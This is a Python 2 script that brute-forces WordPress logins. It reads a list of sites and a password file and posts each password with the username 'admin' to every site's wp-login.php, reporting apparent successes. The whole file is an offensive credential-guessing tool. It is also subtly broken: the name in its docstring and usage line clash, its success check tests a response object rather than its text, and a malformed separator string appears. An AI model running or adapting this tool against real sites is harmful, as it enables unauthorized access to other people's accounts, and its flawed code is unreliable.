#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
#

"""
dorkScanner.py, find sites from dorks.

Usage:
	~$ python2 bruteForce.py sites.txt pwds.txt

	// Brute force process will be started"
"""

__author__ = "Black Viking"
__date__   = "16.04.2017"

import sys
import requests

def brute(site, password, username="admin"):
	''' Try login to site with username:password '''

	if "wp-login.php" not in site:
		if site[-1] != "/":
			site = site + "/wp-login.php"
		else:
			site = site + "wp-login.php"
	else:
		pass

	try:
		payload = {"log": username, "pwd": password}
		text = requests.post(site, data=payload)

		if "dashboard" in text:
			print "\n"+"-*60"+"[+] Site: %s\n\t[*] Username:%s\n\t[*] Password: %s\n"%(site, username, password) + "-"*60
	except:
		pass

if __name__ == '__main__':
	''' When script runs directly '''
	try:
		sites     = open(sys.argv[1], "r").read().split("\n")
		passwords = open(sys.argv[2], "r").read().split("\n")
	except Exception as error:
		print "[!] Error: ", error

	for site in sites:
		print "[-] Trying: ", site
		for pwd in passwords:
			brute(site, pwd)
